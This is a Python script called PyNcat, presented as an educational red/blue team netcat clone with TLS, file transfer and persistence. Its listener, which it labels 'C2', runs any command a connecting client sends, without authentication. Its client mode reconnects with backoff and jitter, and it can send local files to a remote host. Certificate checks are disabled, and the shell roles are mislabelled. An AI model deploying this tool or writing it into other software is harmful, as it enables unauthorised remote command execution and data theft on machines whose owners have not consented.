#!/usr/bin/env python3
"""
PyNcat - Professional Netcat with SSL, Persistence & File Transfer
Educational Red/Blue Team Tool
"""

import argparse
import socket
import subprocess
import sys
import threading
import logging
from pathlib import Path
import time
import random
import ssl
from typing import Optional, Tuple

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)


class PyNcat:
    def __init__(self):
        self.args = self.parse_args()
        self.ssl_context: Optional[ssl.SSLContext] = None
        if self.args.ssl:
            self.setup_ssl()

    def parse_args(self):
        parser = argparse.ArgumentParser(
            description="PyNcat - Professional Netcat with SSL & Persistence",
            formatter_class=argparse.ArgumentDefaultsHelpFormatter
        )

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-l', '--listen', action='store_true', help='Listen mode (C2)')
        group.add_argument('-c', '--connect', type=str, help='Target IP for reverse shell')

        parser.add_argument('-p', '--port', type=int, required=True, help='Port number')
        
        # Features
        parser.add_argument('-e', '--execute', type=str, help='Execute command on connection')
        parser.add_argument('-f', '--file', type=str, help='File to upload (client) / save (listener)')
        
        # SSL
        parser.add_argument('--ssl', action='store_true', help='Enable SSL/TLS')
        parser.add_argument('--cert', type=str, help='SSL certificate path')
        parser.add_argument('--key', type=str, help='SSL private key path')
        
        # Persistence (client only)
        parser.add_argument('--persistent', action='store_true', help='Persistent reverse shell with auto-reconnect')
        parser.add_argument('--max-retries', type=int, default=0, help='Max reconnection attempts (0 = infinite)')
        parser.add_argument('--delay', type=int, default=5, help='Base delay between retries (seconds)')
        
        parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

        return parser.parse_args()

    def setup_ssl(self):
        """Setup SSL context."""
        cert_path = self.args.cert
        key_path = self.args.key

        if not cert_path or not key_path:
            logger.info("[*] Generating self-signed certificate...")
            cert_path, key_path = self.generate_self_signed_cert()

        try:
            if self.args.listen:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(certfile=cert_path, keyfile=key_path)
            else:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

            self.ssl_context = context
            logger.info("[+] SSL context initialized")
        except Exception as e:
            logger.error(f"SSL setup failed: {e}")
            sys.exit(1)

    def generate_self_signed_cert(self) -> Tuple[str, str]:
        """Generate self-signed certificate using pyOpenSSL."""
        try:
            from OpenSSL import crypto
        except ImportError:
            logger.error("[!] pyOpenSSL required. Install: pip install pyOpenSSL")
            sys.exit(1)

        cert_path = "/tmp/pyncat_cert.pem"
        key_path = "/tmp/pyncat_key.pem"

        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)

        cert = crypto.X509()
        cert.get_subject().CN = "pyncat"
        cert.set_serial_number(1000)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(365 * 24 * 60 * 60)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        with open(cert_path, "wb") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(key_path, "wb") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        logger.info(f"[+] Self-signed cert generated: {cert_path}")
        return cert_path, key_path

    def execute_command(self, cmd: str) -> str:
        """Safer command execution."""
        try:
            result = subprocess.run(
                cmd.split(),
                capture_output=True,
                timeout=15,
                text=True
            )
            return result.stdout + result.stderr or "[+] Command executed (no output)\n"
        except subprocess.TimeoutExpired:
            return "[!] Command timed out\n"
        except FileNotFoundError:
            return f"[!] Command not found: {cmd.split()[0] if cmd else 'None'}\n"
        except Exception as e:
            return f"[!] Execution error: {e}\n"

    # ====================== LISTENER ======================
    def handle_client(self, client_socket: socket.socket, addr: tuple):
        logger.info(f"[+] Connection from {addr}")
        try:
            if self.args.execute:
                output = self.execute_command(self.args.execute)
                client_socket.sendall(output.encode())

            if self.args.file and self.args.listen:
                self.save_file(client_socket, self.args.file)

            while True:
                client_socket.sendall(b"pyncat> ")
                data = client_socket.recv(8192)
                if not data:
                    break

                request = data.decode('utf-8').strip()
                if request.lower() in ['exit', 'quit']:
                    client_socket.sendall(b"[*] Goodbye!\n")
                    break

                output = self.execute_command(request)
                client_socket.sendall(output.encode())

        except Exception as e:
            logger.debug(f"Handler error from {addr}: {e}")
        finally:
            client_socket.close()

    def save_file(self, client_socket: socket.socket, filepath: str):
        try:
            with open(filepath, 'wb') as f:
                logger.info(f"[*] Receiving file → {filepath}")
                while True:
                    data = client_socket.recv(8192)
                    if not data:
                        break
                    f.write(data)
            logger.info(f"[+] File saved: {filepath}")
        except Exception as e:
            logger.error(f"File save failed: {e}")

    def listen(self):
        server: Optional[socket.socket] = None
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", self.args.port))

            if self.args.ssl and self.ssl_context:
                server = self.ssl_context.wrap_socket(server, server_side=True)

            server.listen(5)
            mode = "SSL " if self.args.ssl else ""
            logger.info(f"[*] Listening on 0.0.0.0:{self.args.port} ({mode}TCP)")

            while True:
                client, addr = server.accept()
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client, addr),
                    daemon=True
                )
                thread.start()
        except KeyboardInterrupt:
            logger.info("\n[!] Listener shutting down...")
        except Exception as e:
            logger.error(f"Listener error: {e}")
        finally:
            if server:
                server.close()

    # ====================== CLIENT ======================
    def connect_once(self) -> bool:
        """Single connection attempt."""
        client: Optional[socket.socket] = None
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(10)

            if self.args.ssl and self.ssl_context:
                client = self.ssl_context.wrap_socket(client)

            logger.info(f"[*] Connecting to {self.args.connect}:{self.args.port}...")
            client.connect((self.args.connect, self.args.port))
            logger.info("[+] Connected successfully!")

            if self.args.file:
                self.send_file(client, self.args.file)
                return True

            # Interactive shell
            while True:
                try:
                    response = client.recv(8192).decode('utf-8', errors='replace')
                    if response:
                        print(response, end='', flush=True)

                    cmd = input()
                    if cmd.lower() in ['exit', 'quit']:
                        client.sendall(b'exit\n')
                        break
                    client.sendall((cmd + '\n').encode())
                except (ConnectionResetError, BrokenPipeError, EOFError, socket.timeout):
                    logger.info("[!] Connection lost.")
                    return False
        except Exception as e:
            if self.args.verbose:
                logger.debug(f"Connection error: {e}")
            else:
                logger.info(f"[!] Connection failed: {e}")
            return False
        finally:
            if client:
                client.close()
        return True

    def send_file(self, client_socket: socket.socket, filepath: str):
        path = Path(filepath)
        if not path.exists():
            logger.error(f"File not found: {filepath}")
            return

        try:
            filesize = path.stat().st_size
            logger.info(f"[*] Sending file: {filepath} ({filesize} bytes)")
            with open(path, 'rb') as f:
                while chunk := f.read(8192):
                    client_socket.sendall(chunk)
            logger.info("[+] File sent successfully")
        except Exception as e:
            logger.error(f"File transfer failed: {e}")

    def connect_persistent(self):
        """Persistent connection with exponential backoff."""
        retries = 0
        while True:
            try:
                success = self.connect_once()
                if success and not self.args.file:
                    logger.info("[+] Interactive session ended normally.")
                    break
            except KeyboardInterrupt:
                logger.info("\n[!] Persistent shell terminated by user.")
                break

            retries += 1
            if self.args.max_retries > 0 and retries > self.args.max_retries:
                logger.info("[!] Max retries reached. Exiting.")
                break

            # Exponential backoff + jitter
            delay = min(self.args.delay * (2 ** (retries % 6)), 300)
            jitter = random.uniform(0.5, 1.5)
            sleep_time = delay * jitter

            logger.info(f"[*] Reconnecting in {sleep_time:.1f}s... (Attempt {retries})")
            time.sleep(sleep_time)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            if self.args.persistent:
                self.connect_persistent()
            else:
                self.connect_once()


if __name__ == "__main__":
    try:
        pyncat = PyNcat()
        pyncat.run()
    except KeyboardInterrupt:
        print("\n[!] PyNcat terminated by user.")
    except Exception as e:
        logger.error(f"Critical error: {e}")
